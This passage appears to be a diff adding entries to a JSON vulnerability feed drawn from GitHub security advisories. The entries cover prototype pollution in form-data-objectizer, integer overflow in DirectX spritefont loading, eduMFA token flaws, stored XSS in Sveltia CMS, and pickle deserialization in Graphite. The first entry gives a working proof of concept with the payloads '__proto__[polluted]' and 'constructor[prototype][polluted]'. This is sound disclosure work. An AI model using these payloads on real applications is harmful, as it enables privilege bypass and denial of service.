+      "description": "## Summary\n\n`form-data-objectizer` walks bracket-notation form keys (e.g. `name[sub]`) into nested objects without filtering `__proto__`, `constructor`, or `prototype`. A single HTTP form field whose name starts with `__proto__[...]` causes the library to mutate `Object.prototype`, which is a prototype pollution primitive of the entire Node.js process.\n\nThe bug is in `treatInitial` and `treatSecond` inside `index.cjs`:\n\n```js\nif (inputName in result) {           // 'in' walks the prototype chain, so '__proto__' matches\n  newResult = result[inputName]      // newResult === Object.prototype\n}\n// ...\nresult[key] = value                  // sets the property on Object.prototype\n```\n\nWith the form key `__proto__[polluted]` and value `yes`:\n\n1. `treatInitial` matches `inputName = \"__proto__\"`, `rest = \"[polluted]\"`.\n2. `\"__proto__\" in result` is true (inherited), so `newResult = result[\"__proto__\"]`, which is `Object.prototype`.\n3. `treatSecond` recurses with `key = \"polluted\"`, `newRest = \"\"`, and assigns `Object.prototype.polluted = \"yes\"`.\n\n## Affected versions\n\n- `form-data-objectizer` `<= 1.0.0` (currently the only published version)\n\n## Patched\n\nNot yet. Suggested fix: reject any segment equal to `__proto__`, `constructor`, or `prototype` before walking into `result[inputName]` / `result[key]`. Either throw or skip the entry.\n\nMinimum patch in `treatInitial` and `treatSecond`:\n\n```js\nconst REJECT = new Set(['__proto__', 'constructor', 'prototype']);\nif (REJECT.has(inputName) || REJECT.has(key)) {\n  return; // or throw\n}\n```\n\nUsing `Object.create(null)` for the `result` object would also work since it has no prototype to pollute, but the `key === '__proto__'` direct write still needs guarding.\n\n## Proof of concept\n\nFresh install on Node 18+:\n\n```sh\nmkdir pp-fdo && cd pp-fdo\nnpm init -y\nnpm install form-data-objectizer@1.0.0\n```\n\n```js\n// poc.js\nconst FormDataToObject = require('form-data-objectizer');\n\nconst form = new FormData();\nform.append('username', 'alice');\nform.append('__proto__[polluted]', 'yes');\n\nFormDataToObject.toObject(form);\nconsole.log(({}).polluted); // -> 'yes'\n```\n\nObserved output:\n\n```\npackage version: 1.0.0\nbefore pollution: undefined\nafter pollution:  yes\nparsed data:     { username: 'alice' }\nconfirmed:       YES, prototype polluted\n```\n\nThe field name `__proto__[polluted]` is the kind of value an attacker can submit from any HTML form or HTTP client. After the call, every plain object in the process inherits `polluted = 'yes'`. The visible parsed output drops the malicious key, so the attack leaves no obvious trace in request logs that show parsed bodies.\n\nA second working payload is `constructor[prototype][polluted]=yes`, which walks `result.constructor` then `.prototype`.\n\n## Impact\n\n- Default-reachable prototype pollution via a single unauthenticated HTTP form submission, in any Node.js application that uses `form-data-objectizer.toObject()` on incoming form data.\n- Persists for the life of the worker process and affects every subsequent request handled by the same process.\n- Direct downstream consequences depend on the host application and the rest of its dependency tree, but typical risks include: bypassing `if (obj.isAdmin)` style checks, injecting unintended config values into objects merged with user input, breaking template rendering, and crashing the worker by polluting properties used by other libraries (DoS).\n\n## CVSS\n\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` (8.2, High)\n\nIntegrity is High because the primitive lets the attacker change the meaning of property reads on every object in the process. Confidentiality is None and Availability is Low without a named downstream gadget; both could be higher in a specific consuming app.\n\n## Credit\n\nReported by Mohamed Bassia (@0xBassia).",
+      "first_seen": "2026-05-18T16:31:44.441516+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441516+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-m2hg-wjq3-28wq",
+        "https://github.com/kaspernj/form-data-objectizer/commit/7c54b99408e6e9cd6533b7245bf197dadc2a2dbc",
+        "https://github.com/kaspernj/form-data-objectizer/security/advisories/GHSA-m2hg-wjq3-28wq"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "form-data-objectizer: Prototype pollution in form-data-objectizer via bracket-notation form keys"
+    },
+    {
+      "canonical_id": "GHSA-5r97-79vw-qvm4",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-190"
+      ],
+      "description": "### Impact\nThe spritefont reader can be induced to perform a 32-bit overflow multiply that could in theory result in a RCE.\n\nThis impacts the use of the *DirectX Tool Kit* **SpriteFont** class file loading ctor if given untrusted data files.\n\n> Note this only applies to x86/ARM builds of the library. ARM64 and x64 native is not subject to this issue.\n\n### Patches\nThis bug has been fixed in the May 7, 2026 release. Alternatively, you can just update your copy of the reader as per [this commit](https://github.com/microsoft/DirectXTK12/commit/c037a024a7ed3b2162fa2bbbe209b84ba2904494).\n\n### Workarounds\nThis does not apply if a project's .spritefont files are all 'trusted' data that were included with an application. It's primarily an issue only if developers are using user-provided or network downloaded spritefont files.",
+      "first_seen": "2026-05-18T16:31:44.440672+00:00",
+      "frameworks": [
+        "nuget"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440672+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-5r97-79vw-qvm4",
+        "https://github.com/microsoft/DirectXTK12/commit/c037a024a7ed3b2162fa2bbbe209b84ba2904494",
+        "https://github.com/microsoft/DirectXTK12/releases/tag/may2026",
+        "https://github.com/microsoft/DirectXTK12/security/advisories/GHSA-5r97-79vw-qvm4"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Microsoft DirectX12: .spritefont multiply overflow only in 32-bit builds"
+    },
+    {
+      "canonical_id": "GHSA-74r7-3mjm-jc5v",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-20"
+      ],
+      "description": "### Impact\nIf the resolver parameter is passed, but the user does not exist, all failcounters of tokens in that resolver will be increased.\n\n### Patches\nThis, along with other issues, was fixed in eduMFA v2.9.1.\n\n### Workarounds\nLimiting access to `/validate/check` to client applications (i.e. Shibboleth/FreeRADIUS) using an authorization policy with `api_key_required` or using e.g. the reverse proxy.",
+      "first_seen": "2026-05-18T16:31:44.440791+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440791+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-74r7-3mjm-jc5v",
+        "https://github.com/eduMFA/eduMFA/security/advisories/GHSA-74r7-3mjm-jc5v"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "eduMFA: Unauthenticated Failcounter Increment on Resolver Tokens via /validate/check"
+    },
+    {
+      "canonical_id": "GHSA-97r8-rf7q-wmjw",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "### Impact\n\nA stored cross-site scripting (XSS) vulnerability affected entry summary rendering in Sveltia CMS.\n\nEntry summaries that allowed limited Markdown were parsed, sanitized, and then HTML entities were decoded. This order allowed specially crafted entity-encoded HTML, such as encoded tags or event handler attributes, to become active HTML after sanitization. When the resulting summary was rendered in the CMS UI, arbitrary JavaScript could execute in the browser of a user viewing the affected entry list or search result.\n\nThe practical impact is limited in currently supported Sveltia CMS usage because the CMS is intended for a single developer or a small trusted team, and [open authoring](https://sveltiacms.app/en/docs/workflows/open) / untrusted multi-user authoring is not currently implemented. Exploitation requires the ability to place malicious content into the repository or content source that the CMS loads.\n\n### Patches\n\nThe issue has been patched by changing entry summary sanitization so that HTML entity decoding happens before sanitization for Markdown-enabled summaries. This ensures any decoded HTML is processed by the sanitizer before being rendered.\n\nUsers should upgrade to Sveltia CMS [v0.160.1](https://github.com/sveltia/sveltia-cms/releases/tag/v0.160.1) or later.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid loading CMS content from untrusted authors and review content for entity-encoded HTML payloads in fields used by entry summaries.\n\nAdministrators can also reduce exposure by avoiding Markdown-enabled summary rendering for untrusted content where possible, or by ensuring repository write access is limited to trusted users only.\n\n### Resources\n\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- https://cwe.mitre.org/data/definitions/79.html",
+      "first_seen": "2026-05-18T16:31:44.441381+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441381+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-97r8-rf7q-wmjw",
+        "https://github.com/sveltia/sveltia-cms/commit/43a6ac5d0182a503400d8ce1ac156e08f537b1b2",
+        "https://github.com/sveltia/sveltia-cms/releases/tag/v0.160.1",
+        "https://github.com/sveltia/sveltia-cms/security/advisories/GHSA-97r8-rf7q-wmjw"
+      ],
+      "severity": "low",
+      "source_count": 1,
+      "title": "Sveltia CMS: Stored XSS in entry summary rendering via entity-decoded HTML"
+    },
+    {
+      "canonical_id": "GHSA-c55g-rp4x-fx84",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-190"
+      ],
+      "description": "### Impact\nThe spritefont reader can be induced to perform a 32-bit overflow multiply that could in theory result in a RCE.\n\nThis impacts the use of the *DirectX Tool Kit* **SpriteFont** class file loading ctor if given untrusted data files.\n\n> Note this only applies to x86/ARM builds of the library. ARM64 and x64 native is not subject to this issue.\n\n### Patches\nThis bug has been fixed in the May 7, 2026 release. Alternatively, users can update their copy of the reader as per [this commit](https://github.com/microsoft/DirectXTK/commit/ef1bd5d7f492c39dd0cd87493ba8ea38725c9791).\n\n### Workarounds\nThis does not apply if a project's .spritefont files are all 'trusted' data that were included with an application. It's primarily an issue only if developers are using user-provided or network downloaded spritefont files.",
+      "first_seen": "2026-05-18T16:31:44.440684+00:00",
+      "frameworks": [
+        "nuget"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440684+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-c55g-rp4x-fx84",
+        "https://github.com/microsoft/DirectXTK/commit/ef1bd5d7f492c39dd0cd87493ba8ea38725c9791",
+        "https://github.com/microsoft/DirectXTK/releases/tag/may2026",
+        "https://github.com/microsoft/DirectXTK/security/advisories/GHSA-c55g-rp4x-fx84"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Microsoft DirectX: .spritefont multiply overflow only in 32-bit builds"
+    },
+    {
+      "canonical_id": "GHSA-qq2p-4282-cfc5",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-285"
+      ],
+      "description": "### Impact\n\nFor deployments using MySQL or MariaDB < 11.6.2 (or newer with innodb_snapshot_isolation=off) reusage of token values might be possible due to faulty transaction isolation inside the database. Exploiting this requires racing this transaction.\nAffected are all tokentypes whose values are only supposed to be used once, for example TOTP, HOTP and likely also WebAuthN.\n\n#### Affected Combinations:\n\n- MySQL (any version)\n- MariaDB with innodb_snapshot_isolation=OFF\n  - innodb_snapshot_isolation was introduced in: MariaDB 10.6.18, MariaDB 10.11.8, MariaDB 11.0.6, MariaDB 11.1.5, MariaDB 11.2.4, MariaDB 11.4.2\n    with default OFF, can be turned ON as a workaround\n  - for MariaDB >= 11.6.2 the default is ON, which is not affected\n- Same rules applies for Galera with underlying MariaDB\n\n### Patches\nFixed in version 2.9.1 by locking rows prior to write with SELECT FOR UPDATE.\n\n### Workarounds\nSet innodb_snapshot_isolation to ON (default in MariaDB >= 11.6.2, e.g packaged in Debian 13).\n\n### Resources\nhttps://mariadb.com/resources/blog/isolation-level-violation-testing-and-debugging-in-mariadb/",
+      "first_seen": "2026-05-18T16:31:44.440762+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440762+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-qq2p-4282-cfc5",
+        "https://github.com/eduMFA/eduMFA/security/advisories/GHSA-qq2p-4282-cfc5"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "eduMFA: Incorrect InnoDB snapshot isolation possibly allows token reusage"
+    },
+    {
+      "canonical_id": "GHSA-qw48-84f6-28gv",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-502"
+      ],
+      "description": "### Impact\n**Type of vulnerability:** Insecure Deserialization via Python's `pickle` module.\n\n**Who is impacted:**  \nUsers of *Graphite graph database engine* versions **before 0.2** who load database files from untrusted or third-party sources.  \nAn attacker could craft a malicious database file that executes arbitrary code when loaded by the engine. This is possible because the engine used `pickle` for serialization, which is known to be unsafe for untrusted data.\n\n### Patches\nThe vulnerability has been patched starting from **version 0.2**.  \nAll users should upgrade to **version 0.2 or later** (the current version is 0.4 at publishing time).  \nIn version 0.2 and above, the engine uses **JSON** instead of `pickle` for database storage, eliminating the deserialization risk.\n\n### Workarounds\nIf users cannot upgrade immediately:\n\n1. **Do not load database files from untrusted or unknown sources** when using versions <0.2.\n2. **Migrate existing pickle-based databases** to the new JSON format using the provided migration module:\n\n```python\nfrom graphite.Migration import convert_pickle_to_json\nconvert_pickle_to_json(\"path/to/old_database.pkl\", \"path/to/new_database.json\")\n```\n\nAfter migration, you can safely use the database with version 0.2+.\n\n**Note:** Versions 0.2 and later will show a **warning** when attempting to load legacy pickle files, reminding you to migrate them. Also, **you can't load pickle files** in 0.2 and later.\n\n### Resources\n- Upgrade to [v0.2 or newer](https://github.com/mkh-user/graphite/releases)\n- Migration guide: See `graphite.Migration` module documentation\n- More on pickle security: [Python docs \u2013 pickle security](https://docs.python.org/3/library/pickle.html#module-pickle)",
+      "first_seen": "2026-05-18T16:31:44.441543+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441543+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-qw48-84f6-28gv",
+        "https://github.com/mkh-user/graphite/releases/tag/v0.2",
+        "https://github.com/mkh-user/graphite/security/advisories/GHSA-qw48-84f6-28gv"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Graphite Has a Pickle Deserialization Vulnerability"
+    }
+  ],
+  "correlated_at": "2026-05-18T16:31:49.037419+00:00"
 }
